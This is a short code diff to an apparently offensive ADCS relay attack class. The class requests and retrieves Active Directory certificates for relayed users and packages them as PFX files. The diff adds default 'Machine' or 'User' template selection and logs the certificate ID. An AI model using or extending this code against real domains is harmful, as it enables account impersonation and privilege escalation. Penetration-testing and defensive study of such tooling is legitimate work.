@@ -32,6 +32,10 @@ class ADCSAttack:
         if self.username in ELEVATED:
             LOG.info('Skipping user %s since attack was already performed' % self.username)
             return
+
+        if self.config.template is None:
+            self.config.template = "Machine" if self.username.endswith("$") else "User"
+
         csr = self.generate_csr(key, self.username)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         LOG.info("CSR generated!")
@@ -65,7 +69,7 @@ class ADCSAttack:
         self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
         response = self.client.getresponse()
 
-        LOG.info("GOT CERTIFICATE!")
+        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
         certificate = response.read().decode()
 
         certificate_store = self.generate_pfx(key, certificate)
